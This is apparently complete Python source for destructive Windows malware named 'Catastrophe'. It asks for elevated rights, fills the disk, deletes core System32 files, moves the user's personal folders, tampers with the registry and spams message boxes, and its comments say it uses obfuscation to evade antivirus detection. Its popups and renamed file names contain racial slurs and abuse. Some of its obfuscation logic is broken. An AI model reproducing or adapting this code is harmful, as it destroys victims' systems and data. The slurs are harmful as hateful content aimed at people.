import tkinter as tk
from tkinter import messagebox
import os
import random
import string
import shutil
import subprocess
import ctypes
import win32gui
import win32con
import win32api
import time
import pyautogui
import base64
import sys
import winreg as winreg

# Encrypt strings to avoid signature-based detection
def encrypt_string(s):
    return base64.b64encode(s.encode()).decode()

# Decrypt strings at runtime
def decrypt_string(s):
    return base64.b64decode(s.encode()).decode()

# Obfuscated and encrypted function names
func_names = {
    'generate_junk_data': encrypt_string('_0x123456789abcdef'),
    'fill_disk_with_junk': encrypt_string('_0x987654321fedcba'),
    'delete_system_files': encrypt_string('_0xdeadbeefcafe'),
    'move_important_folders': encrypt_string('_0x1234567890abcdef'),
    'corrupt_system_registry': encrypt_string('_0xfedcba9876543210'),
    'change_desktop_background': encrypt_string('_0x5555555555555555'),
    'rename_application_names': encrypt_string('_0xaaaaaaaaaaaaaaaa'),
    'change_system_volume': encrypt_string('_0xbbbbbbbbbbbbbbbb'),
    'disable_mouse_and_keyboard': encrypt_string('_0xcccccccccccccccc'),
    'display_annoying_message_boxes': encrypt_string('_0xdddddddddddddddd'),
    'spam_hello_message_boxes': encrypt_string('_0xeeeeeeeeeeeeeeee'),
    'elevate_privileges': encrypt_string('_0xffffff0000000000'),
    'main': encrypt_string('_0x0000000000000000')
}

# Dynamically load functions
def load_function(name):
    return globals()[decrypt_string(func_names[name])]

# Function to generate random junk data
def generate_junk_data():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=1024 * 1024 * 1000))  # 1 GB of junk data

# Function to fill disk with junk data
def fill_disk_with_junk():
    try:
        junk_file_path = os.path.join(os.getenv('TEMP'), 'junk_data.txt')
        with open(junk_file_path, 'w') as junk_file:
            junk_file.write(generate_junk_data())
    except Exception as e:
        pass

# Function to delete important system files
def delete_system_files():
    system_files = [
        os.path.join(os.getenv('WINDIR'), 'System32', 'calc.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'notepad.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'cmd.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'explorer.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'taskmgr.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'regedit.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'msconfig.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'services.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'svchost.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'lsass.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'winlogon.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'userinit.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'wininit.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'csrss.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'win32k.sys'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'ntoskrnl.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'hal.dll'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'bootmgr'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'bootmgr.efi'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'bootmgr.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'winload.efi'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'winload.exe'),
        os.path.join(os.getenv('WINDIR'), 'System32', 'bcdedit.exe')
    ]
    for file_path in system_files:
        try:
            os.remove(file_path)
        except Exception as e:
            pass

# Function to move important folders to a different location
def move_important_folders():
    important_folders = [
        os.path.join(os.getenv('USERPROFILE'), 'Documents'),
        os.path.join(os.getenv('USERPROFILE'), 'Downloads'),
        os.path.join(os.getenv('USERPROFILE'), 'Pictures'),
        os.path.join(os.getenv('USERPROFILE'), 'Music'),
        os.path.join(os.getenv('USERPROFILE'), 'Videos'),
        os.path.join(os.getenv('USERPROFILE'), 'Desktop')
    ]
    new_location = os.path.join(os.getenv('TEMP'), 'moved_folders')
    os.makedirs(new_location, exist_ok=True)
    for folder in important_folders:
        try:
            shutil.move(folder, new_location)
        except Exception as e:
            pass

# Function to corrupt system registry
def corrupt_system_registry():
    try:
        subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', 'Catastrophe', '/t', 'REG_SZ', '/d', 'C:\\Windows\\System32\\cmd.exe', '/f'])
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', 'Catastrophe', '/t', 'REG_SZ', '/d', 'C:\\Windows\\System32\\cmd.exe', '/f'])
        subprocess.run(['reg', 'delete', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', 'Catastrophe', '/f'])
        subprocess.run(['reg', 'delete', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', 'Catastrophe', '/f'])
    except Exception as e:
        pass

# Function to change desktop background
def change_desktop_background(image_path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, image_path, win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE)
    except Exception as e:
        pass

# Function to rename application names
def rename_application_names():
    try:
        app_names = {
            'notepad.exe': 'FUCK YOU NIGGER.exe',
            'calc.exe': 'FUCK YOU NIGGER.exe',
            'mspaint.exe': 'FUCK YOU NIGGER.exe'
        }
        for old_name, new_name in app_names.items():
            old_path = os.path.join(os.getenv('WINDIR'), 'System32', old_name)
            new_path = os.path.join(os.getenv('WINDIR'), 'System32', new_name)
            os.rename(old_path, new_path)
    except Exception as e:
        pass

# Function to change system volume
def change_system_volume(volume_level):
    try:
        volume_control = ctypes.cast(ctypes.windll.winmm.waveOutGetVolume(ctypes.byref(ctypes.c_int(0))), ctypes.POINTER(ctypes.c_int))
        volume_control.contents.value = volume_level
        ctypes.windll.winmm.waveOutSetVolume(ctypes.byref(volume_control), ctypes.c_int(0))
    except Exception as e:
        pass

# Function to disable mouse and keyboard
def disable_mouse_and_keyboard():
    try:
        pyautogui.FAILSAFE = False
        pyautogui.moveTo(100, 100)
        pyautogui.click()
        pyautogui.press('esc')
    except Exception as e:
        pass

# Function to display annoying message boxes
def display_annoying_message_boxes():
    try:
        while True:
            messagebox.showwarning("Catastrophe", "You are fucked, nigger!")
            time.sleep(1)
    except Exception as e:
        pass

# Function to spam "HELLO!" message boxes all over the screen
def spam_hello_message_boxes():
    try:
        for _ in range(50):  # Spam 50 message boxes
            root = tk.Tk()
            root.withdraw()
            messagebox.showinfo("HELLO!", "HELLO!")
    except Exception as e:
        pass

# Function to elevate privileges
def elevate_privileges():
    try:
        ctypes.windll.shell32.IsUserAnAdmin()
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    except Exception as e:
        pass

# Main function to execute the malware
def main():
    elevate_privileges()
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Congratulations, retard:D", "You just downloaded malware,dumbfuck\nyour system will be destoyed by catastrophe,a malware created by fortnitepro01 (@legoohakc on discord)\n\n Note: Trying to shutdown catastrophe will result in permanent damage;)")
    fill_disk_with_junk()
    delete_system_files()
    move_important_folders()
    corrupt_system_registry()
    change_desktop_background(r'C:\path\to\your\image.jpg')  # Update this path to the image you want to set as background
    rename_application_names()
    change_system_volume(0)  # Set volume to 0
    disable_mouse_and_keyboard()
    display_annoying_message_boxes()
    spam_hello_message_boxes()
    messagebox.showinfo("Still want project ligma XD? \n fortnitepro01 and meflly100 was here", "")
    root.mainloop()

if __name__ == "__main__":
    load_function('main')()